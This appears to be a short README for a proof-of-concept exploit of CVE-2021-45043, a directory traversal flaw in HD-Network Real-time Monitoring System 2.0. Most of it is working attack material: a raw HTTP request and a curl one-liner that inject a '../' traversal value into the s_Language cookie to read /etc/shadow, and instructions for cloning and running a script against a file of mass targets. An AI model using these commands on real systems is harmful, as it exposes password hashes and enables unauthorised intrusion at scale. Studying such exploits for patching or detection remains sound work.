# cve-2021-45043
HD-Network Real-time Monitoring System 2.0 allows ../ directory traversal to read /etc/shadow via the /language/lang s_Language parameter.

# initial post
https://cyberguy0xd1.medium.com/my-cve-2021-45043-lfi-write-up-441dad30dd7f

# exploiting via burp 
GET /language/lang HTTP/1.1
Host: IP.target
Cookie: s_Language=../../../../../../../../../../../../../../etc/shadow

# exploiting via one liner 
curl -k -s -H "Cookie: s_Language=../../../../../../../../../../../../../../etc/shadow" -X GET http://IP.target/language/lang

# exploiting mass targets
git clone https://github.com/g30rgyth3d4rk/cve-2021-45043.git

cd cve-2021-45043/

chmod +x script.sh

./script.sh targets.txt
